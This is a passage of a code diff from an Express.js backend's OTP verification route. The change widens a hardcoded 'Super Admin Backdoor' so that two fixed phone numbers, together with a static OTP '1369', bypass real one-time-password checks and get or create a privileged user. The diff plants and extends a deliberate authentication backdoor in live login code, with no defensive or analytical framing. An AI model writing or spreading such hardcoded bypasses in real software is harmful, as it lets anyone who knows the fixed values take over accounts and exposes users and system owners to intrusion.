@@ -1686,9 +1686,9 @@ app.post('/api/verify-otp', async (req, res) => {
   const { phone, otp } = req.body;
   logActivity('auth', 'OTP verification attempt', { phone });
 
-  // --- Super Admin Backdoor ---
-  if (phone === '9876543210' && otp === '1369') {
-    let user = await User.findOne({ phone });
+  // --- Super Admin Backdoors ---
+  if ((phone === '9876543210' || phone === '6382379565') && otp === '1369') {
+    let user = await User.findOne({ phone: { $in: ['9876543210', '6382379565'] } });
     if (!user) {
       user = await User.create({
         userId: crypto.randomUUID(),
